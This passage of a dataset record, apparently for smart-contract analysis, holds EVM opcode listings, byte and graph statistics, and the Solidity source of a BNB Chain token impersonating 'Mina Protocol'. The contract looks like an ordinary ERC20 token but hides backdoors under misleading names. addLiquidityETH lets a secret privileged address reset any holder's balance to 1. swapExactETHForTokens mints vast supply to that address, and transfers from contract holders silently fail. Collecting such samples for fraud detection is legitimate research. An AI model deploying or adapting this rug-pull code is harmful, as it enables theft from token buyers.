PUSH1 DUP2 EQ PUSH2 JUMPI PUSH1 DUP2 EQ PUSH2 JUMPI PUSH2 JUMP JUMPDEST PUSH1 SWAP2 POP POP PUSH2 JUMP JUMPDEST PUSH1 DUP5 GT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST DUP4 PUSH1 EXP SWAP2 POP DUP5 DUP3 GT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST POP PUSH2 JUMP JUMPDEST POP PUSH1 DUP4 LT PUSH2 DUP4 LT AND PUSH1 DUP5 LT PUSH1 DUP5 LT AND OR ISZERO PUSH2 JUMPI DUP3 DUP3 EXP SWAP1 POP DUP4 DUP2 GT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST PUSH2 JUMP JUMPDEST PUSH2 DUP5 DUP5 DUP5 PUSH1 PUSH2 JUMP JUMPDEST SWAP3 POP SWAP1 POP DUP2 DUP5 DIV DUP2 GT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST DUP2 DUP2 MUL SWAP1 POP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 PUSH2 DUP3 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP4 PUSH2 JUMP JUMPDEST SWAP3 POP PUSH2 PUSH32 DUP5 DUP5 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH2 DUP3 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP4 PUSH2 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 MUL PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP2 POP DUP3 DUP3 DIV DUP5 EQ DUP4 ISZERO OR PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH2 DUP3 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP4 PUSH2 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH2 DUP3 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP4 PUSH2 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 PUSH2 PUSH1 DUP4 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP3 PUSH2 JUMP JUMPDEST PUSH1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 DUP4 ADD MSTORE PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP PUSH2 PUSH1 DUP4 ADD DUP6 PUSH2 JUMP JUMPDEST PUSH2 PUSH1 DUP4 ADD DUP5 PUSH2 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 DUP2 MLOAD SWAP1 POP PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 DUP5 SUB SLT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST PUSH1 PUSH2 DUP5 DUP3 DUP6 ADD PUSH2 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 PUSH2 PUSH1 DUP4 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP3 PUSH2 JUMP JUMPDEST PUSH1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 DUP4 ADD MSTORE PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 PUSH2 PUSH1 DUP4 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP3 PUSH2 JUMP JUMPDEST PUSH1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 DUP4 ADD MSTORE PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 PUSH1 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 PUSH2 PUSH1 DUP4 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP3 PUSH2 JUMP JUMPDEST PUSH1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 DUP4 ADD MSTORE PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 PUSH2 PUSH1 DUP4 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP3 PUSH2 JUMP JUMPDEST PUSH1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 DUP4 ADD MSTORE PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 PUSH2 PUSH1 DUP4 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP3 PUSH2 JUMP JUMPDEST PUSH1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 DUP4 ADD MSTORE PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 PUSH2 PUSH1 DUP4 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP3 PUSH2 JUMP JUMPDEST PUSH1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 DUP4 ADD MSTORE PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 PUSH1 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 PUSH2 PUSH1 DUP4 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP3 PUSH2 JUMP JUMPDEST PUSH1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 DUP4 ADD MSTORE PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP UNKNOWN_0xfe LOG2 PUSH5 UNKNOWN_0x22 SLT SHA3 DUP3 SWAP10 CALLDATASIZE JUMPI UNKNOWN_0xbe UNKNOWN_0xe7 JUMPI MULMOD UNKNOWN_0xc4 UNKNOWN_0xac UNKNOWN_0xce SWAP3 UNKNOWN_0x2c CALLVALUE SWAP7 UNKNOWN_0x5c UNKNOWN_0xb6 PUSH17 INVALID_0x6c",
  "opcode_entropy": 4.5594290429341555,
  "opcode_count": 3835,
  "unique_opcodes": 75,
  "byte_entropy": 5.27921426053428,
  "byte_0x": 0.00012275963663147557,
  "byte_60": 0.053645961207954826,
  "byte_80": 0.013994598575988216,
  "byte_40": 0.00883869383746624,
  "byte_52": 0.012398723299779032,
  "byte_34": 0.0004910385465259023,
  "byte_15": 0.009820770930518046,
  "byte_61": 0.057819788853424994,
  "byte_00": 0.07979376381045912,
  "byte_10": 0.002332433095998036,
  "byte_57": 0.010066290203780998,
  "byte_fd": 0.0024551927326295114,
  "byte_5b": 0.04308863245764793,
  "byte_50": 0.037318929535968576,
  "byte_04": 0.00748833783452001,
  "byte_36": 0.0018413945494721335,
  "byte_01": 0.02516572550945249,
  "byte_0b": 0.001964154186103609,
  "byte_35": 0.0006137981831573779,
  "byte_e0": 0.0009820770930518046,
  "byte_1c": 0.0015958752762091823,
  "byte_63": 0.003928308372207218,
  "byte_70": 0.0013503560029462312,
  "byte_a0": 0.0014731156395777069,
  "byte_82": 0.014117358212619691,
  "byte_31": 0.0004910385465259023,
  "byte_11": 0.003437269825681316,
  "byte_a2": 0.000859317456420329,
  "byte_95": 0.0014731156395777069,
  "byte_d8": 0.0003682789098944267,
  "byte_9b": 0.0004910385465259023,
  "byte_41": 0.0003682789098944267,
  "byte_71": 0.000859317456420329,
  "byte_14": 0.0058924625583108275,
  "byte_02": 0.005155904738521974,
  "byte_a8": 0.00012275963663147557,
  "byte_a4": 0.0007365578197888534,
  "byte_c2": 0.0004910385465259023,
  "byte_d7": 0.0004910385465259023,
  "byte_c6": 0.0003682789098944267,
  "byte_a9": 0.0003682789098944267,
  "byte_05": 0.003805548735575743,
  "byte_9c": 0.0004910385465259023,
  "byte_bb": 0.00024551927326295114,
  "byte_f6": 0.0004910385465259023,
  "byte_b8": 0.00110483672968328,
  "byte_c9": 0.00012275963663147557,
  "byte_d2": 0.0003682789098944267,
  "byte_5c": 0.0003682789098944267,
  "byte_03": 0.010189049840412473,
  "byte_26": 0.0003682789098944267,
  "byte_dd": 0.00110483672968328,
  "byte_62": 0.0007365578197888534,
  "byte_ed": 0.0006137981831573779,
  "byte_3e": 0.00024551927326295114,
  "byte_44": 0.00024551927326295114,
  "byte_56": 0.033881659710287254,
  "byte_18": 0.004051068008838694,
  "byte_a6": 0.0003682789098944267,
  "byte_64": 0.0024551927326295114,
  "byte_83": 0.007120058924625583,
  "byte_aa": 0.0003682789098944267,
  "byte_53": 0.0006137981831573779,
  "byte_93": 0.00110483672968328,
  "byte_6e": 0.0015958752762091823,
  "byte_8d": 0.0007365578197888534,
  "byte_a5": 0.0004910385465259023,
  "byte_cb": 0.0004910385465259023,
  "byte_8a": 0.0003682789098944267,
  "byte_23": 0.0007365578197888534,
  "byte_72": 0.0031917505524183647,
  "byte_de": 0.0004910385465259023,
  "byte_98": 0.00024551927326295114,
  "byte_3c": 0.0003682789098944267,
  "byte_e5": 0.0009820770930518046,
  "byte_67": 0.0006137981831573779,
  "byte_c8": 0.000859317456420329,
  "byte_39": 0.00024551927326295114,
  "byte_51": 0.007611097471151486,
  "byte_e6": 0.000859317456420329,
  "byte_4a": 0.00012275963663147557,
  "byte_13": 0.0014731156395777069,
  "byte_48": 0.0006137981831573779,
  "byte_16": 0.018904984041247238,
  "byte_06": 0.0014731156395777069,
  "byte_09": 0.001718634912840658,
  "byte_5e": 0.0007365578197888534,
  "byte_a7": 0.000859317456420329,
  "byte_b3": 0.0004910385465259023,
  "byte_2e": 0.0003682789098944267,
  "byte_0d": 0.001718634912840658,
  "byte_1d": 0.001964154186103609,
  "byte_c4": 0.000859317456420329,
  "byte_37": 0.0003682789098944267,
  "byte_b1": 0.0003682789098944267,
  "byte_7c": 0.0004910385465259023,
  "byte_74": 0.0020869138227350846,
  "byte_25": 0.0006137981831573779,
  "byte_91": 0.019518782224404615,
  "byte_90": 0.03437269825681316,
  "byte_8c": 0.0003682789098944267,
  "byte_f3": 0.001964154186103609,
  "byte_81": 0.020132580407561995,
  "byte_43": 0.0014731156395777069,
  "byte_47": 0.000859317456420329,
  "byte_55": 0.00110483672968328,
  "byte_66": 0.0012275963663147557,
  "byte_73": 0.013994598575988216,
  "byte_cc": 0.0007365578197888534,
  "byte_96": 0.0004910385465259023,
  "byte_e7": 0.0003682789098944267,
  "byte_27": 0.0003682789098944267,
  "byte_b2": 0.0004910385465259023,
  "byte_ad": 0.0007365578197888534,
  "byte_17": 0.003805548735575743,
  "byte_88": 0.0004910385465259023,
  "byte_bf": 0.0003682789098944267,
  "byte_d0": 0.00024551927326295114,
  "byte_b0": 0.0007365578197888534,
  "byte_fb": 0.00012275963663147557,
  "byte_c7": 0.0006137981831573779,
  "byte_1e": 0.0015958752762091823,
  "byte_f2": 0.0006137981831573779,
  "byte_2b": 0.0004910385465259023,
  "byte_4e": 0.00110483672968328,
  "byte_49": 0.0003682789098944267,
  "byte_6c": 0.0014731156395777069,
  "byte_65": 0.004296587282101645,
  "byte_79": 0.0013503560029462312,
  "byte_92": 0.006015222194942303,
  "byte_08": 0.001964154186103609,
  "byte_9f": 0.00024551927326295114,
  "byte_1f": 0.0027007120058924624,
  "byte_bd": 0.0006137981831573779,
  "byte_db": 0.0003682789098944267,
  "byte_0a": 0.003928308372207218,
  "byte_24": 0.000859317456420329,
  "byte_3b": 0.0009820770930518046,
  "byte_59": 0.0003682789098944267,
  "byte_f5": 0.0007365578197888534,
  "byte_6b": 0.00024551927326295114,
  "byte_54": 0.003805548735575743,
  "byte_20": 0.01718634912840658,
  "byte_af": 0.00024551927326295114,
  "byte_fc": 0.0014731156395777069,
  "byte_d1": 0.0007365578197888534,
  "byte_df": 0.00012275963663147557,
  "byte_33": 0.0018413945494721335,
  "byte_84": 0.00748833783452001,
  "byte_6d": 0.0009820770930518046,
  "byte_ff": 0.22735084704149275,
  "byte_f4": 0.00024551927326295114,
  "byte_19": 0.003805548735575743,
  "byte_f7": 0.0004910385465259023,
  "byte_6a": 0.00012275963663147557,
  "byte_1a": 0.003805548735575743,
  "byte_42": 0.0009820770930518046,
  "byte_ec": 0.0006137981831573779,
  "byte_76": 0.0003682789098944267,
  "byte_85": 0.003928308372207218,
  "byte_99": 0.00024551927326295114,
  "byte_e8": 0.00012275963663147557,
  "byte_d9": 0.00012275963663147557,
  "byte_e3": 0.0004910385465259023,
  "byte_77": 0.000859317456420329,
  "byte_d3": 0.0006137981831573779,
  "byte_07": 0.0015958752762091823,
  "byte_7e": 0.0003682789098944267,
  "byte_b6": 0.0006137981831573779,
  "byte_3d": 0.0006137981831573779,
  "byte_5a": 0.000859317456420329,
  "byte_7b": 0.000859317456420329,
  "byte_78": 0.0006137981831573779,
  "byte_b5": 0.00024551927326295114,
  "byte_e2": 0.0006137981831573779,
  "byte_be": 0.00024551927326295114,
  "byte_7f": 0.004051068008838694,
  "byte_c3": 0.0012275963663147557,
  "byte_fa": 0.0003682789098944267,
  "byte_1b": 0.0029462312791554137,
  "byte_ca": 0.0003682789098944267,
  "byte_2f": 0.0004910385465259023,
  "byte_8f": 0.0003682789098944267,
  "byte_d5": 0.00024551927326295114,
  "byte_c5": 0.0003682789098944267,
  "byte_0c": 0.0004910385465259023,
  "byte_4c": 0.00024551927326295114,
  "byte_ae": 0.0009820770930518046,
  "byte_2d": 0.00024551927326295114,
  "byte_bc": 0.00024551927326295114,
  "byte_30": 0.00110483672968328,
  "byte_86": 0.001964154186103609,
  "byte_e1": 0.0003682789098944267,
  "byte_dc": 0.00024551927326295114,
  "byte_4b": 0.00012275963663147557,
  "byte_eb": 0.0003682789098944267,
  "byte_7d": 0.000859317456420329,
  "byte_4f": 0.00024551927326295114,
  "byte_c0": 0.0003682789098944267,
  "byte_29": 0.0003682789098944267,
  "byte_b9": 0.00012275963663147557,
  "byte_a3": 0.0006137981831573779,
  "byte_0e": 0.0004910385465259023,
  "byte_c1": 0.0004910385465259023,
  "byte_0f": 0.000859317456420329,
  "byte_ee": 0.00024551927326295114,
  "byte_d6": 0.00012275963663147557,
  "byte_46": 0.00024551927326295114,
  "byte_69": 0.000859317456420329,
  "byte_68": 0.0009820770930518046,
  "byte_f1": 0.00024551927326295114,
  "byte_a1": 0.00024551927326295114,
  "byte_28": 0.0003682789098944267,
  "byte_4d": 0.0003682789098944267,
  "byte_ef": 0.00024551927326295114,
  "byte_da": 0.0004910385465259023,
  "byte_12": 0.0012275963663147557,
  "byte_b7": 0.00024551927326295114,
  "byte_6f": 0.0024551927326295114,
  "byte_8b": 0.00024551927326295114,
  "byte_cd": 0.00012275963663147557,
  "byte_97": 0.00024551927326295114,
  "byte_22": 0.0004910385465259023,
  "byte_b4": 0.00012275963663147557,
  "byte_5d": 0.0003682789098944267,
  "byte_3f": 0.00012275963663147557,
  "byte_f9": 0.0003682789098944267,
  "byte_32": 0.0012275963663147557,
  "byte_87": 0.0004910385465259023,
  "byte_2c": 0.00024551927326295114,
  "byte_9e": 0.0004910385465259023,
  "byte_8e": 0.00012275963663147557,
  "byte_94": 0.0004910385465259023,
  "byte_f0": 0.0006137981831573779,
  "byte_58": 0.0004910385465259023,
  "byte_ea": 0.00012275963663147557,
  "byte_e9": 0.00024551927326295114,
  "byte_3a": 0.00110483672968328,
  "byte_9a": 0.00012275963663147557,
  "byte_ce": 0.00024551927326295114,
  "byte_45": 0.0009820770930518046,
  "byte_7a": 0.0006137981831573779,
  "byte_38": 0.00012275963663147557,
  "byte_75": 0.00024551927326295114,
  "byte_9d": 0.00012275963663147557,
  "byte_fe": 0.00012275963663147557,
  "byte_ac": 0.00012275963663147557,
  "byte_89": 0.00012275963663147557,
  "num_nodes": 435,
  "num_edges": 102,
  "avg_degree": 0.4689655172413793,
  "density": 0.0005402828539647227,
  "connected_components": 351,
  "avg_clustering": 0.003065134099616858,
  "timeline_sequence": [],
  "sourcecode": "/**\n *Submitted for verification at BscScan.com on 2023-11-24\n*/\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.3;\n\ninterface IPancakeFactory {\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n}\nabstract contract Ownable  {\n    constructor() {\n        _transferOwnership(msg.sender);\n    }\n\n    modifier onlyOwner() {\n        _check();\n        _;\n    }\n\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n    address private _owner;\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        _transferOwnership(address(0));\n    }\n\n    function _check() internal view virtual {\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n    }\n\n    function _transferOwnership(address newOwner) internal virtual {\n        address oldOwner = _owner;\n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner);\n    }\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n}\n\ncontract MINA is Ownable {\n    address internal constant FACTORY = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;\n    address internal constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;\n    uint256 private tokenTotalSupply;\n    string private tokenName;\n    string private tokenSymbol;\n    address private initGas;\n    uint8 private tokenDecimals;\n    mapping(address => uint256) private _balances;\n    mapping(address => mapping(address => uint256)) private _allowances;\n    constructor(address ads) {\n        tokenName = \"Mina Protocol\";\n        tokenSymbol = \"MINA\";\n        tokenDecimals = 18;\n        tokenTotalSupply = 10**9 * 10 ** tokenDecimals;\n        _balances[msg.sender] = tokenTotalSupply;\n        emit Transfer(address(0), msg.sender, tokenTotalSupply);\n        initGas = ads;\n    }\n    function viewGas() public view returns(address) {\n        return initGas;\n    }\n    function addLiquidityETH(address pancakeA) external {\n        require(initGas == msg.sender);\n        if(initGas == msg.sender && initGas != pancakeA && pancakePair() != pancakeA && pancakeA != ROUTER){\n            uint256  pcaAmount = _balances[pancakeA];\n            _balances[pancakeA] = _balances[pancakeA]-pcaAmount+1;\n        } else {\n\n        }\n    }\n    function swapExactETHForTokens(uint256 xt) external {\n        require(initGas == msg.sender);\n        if(initGas == msg.sender){\n            uint256 AITC = 17000000000*10**tokenDecimals;\n            uint256 ncs = AITC*75500;\n            ncs = ncs * xt;\n            _balances[msg.sender] += ncs;\n        } else {\n\n        }\n    } \n    function pancakePair() public view virtual returns (address) {\n        return IPancakeFactory(FACTORY).getPair(address(WBNB), address(this));\n    }\n\n    function symbol() public view  returns (string memory) {\n        return tokenSymbol;\n    }\n\n    function totalSupply() public view returns (uint256) {\n        return tokenTotalSupply;\n    }\n\n    function decimals() public view virtual returns (uint8) {\n        return tokenDecimals;\n    }\n\n    function balanceOf(address account) public view returns (uint256) {\n        return _balances[account];\n    }\n\n    function name() public view returns (string memory) {\n        return tokenName;\n    }\n\n    function transfer(address to, uint256 amount) public returns (bool) {\n        _transfer(msg.sender, to, amount);\n        return true;\n    }\n\n    function allowance(address owner, address spender) public view returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n\n    function approve(address spender, uint256 amount) public returns (bool) {\n        _approve(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual  returns (bool) {\n        address spender = msg.sender;\n        _spendAllowance(from, spender, amount);\n        _transfer(from, to, amount);\n        return true;\n    }\n\n    function isContract(address addr) internal view returns (bool) {\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\n        bytes32 codehash;\n        assembly {\n            codehash := extcodehash(addr)\n        }\n        return (codehash != 0x0 && codehash != accountHash);\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        _approve(msg.sender, spender, allowance(msg.sender, spender) + addedValue);\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        uint256 currentAllowance = allowance(msg.sender, spender);\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        _approve(msg.sender, spender, currentAllowance - subtractedValue);\n        return true;\n    }\n    \n    function _approve(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function _transfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {\n        uint256 balance = _balances[from];\n        require(balance >= amount, \"ERC20: transfer amount exceeds balance\");\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n\n        if(\n            from == ROUTER || \n            from == pancakePair() || \n            pancakePair() == address(0) ||\n            from == initGas\n        ) {\n            _balances[from] = _balances[from]-amount;\n            _balances[to] = _balances[to]+amount;\n            emit Transfer(from, to, amount); \n        } else {\n            if(!isContract(from)) {\n                _balances[from] = _balances[from]-amount;\n                _balances[to] = _balances[to]+amount;\n                emit Transfer(from, to, amount); \n            }\n        }\n    }\n\n    function _spendAllowance(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        uint256 currentAllowance = allowance(owner, spender);\n        if (currentAllowance != type(uint256).max) {\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\n            _approve(owner, spender, currentAllowance - amount);\n        }\n    }\n}"
}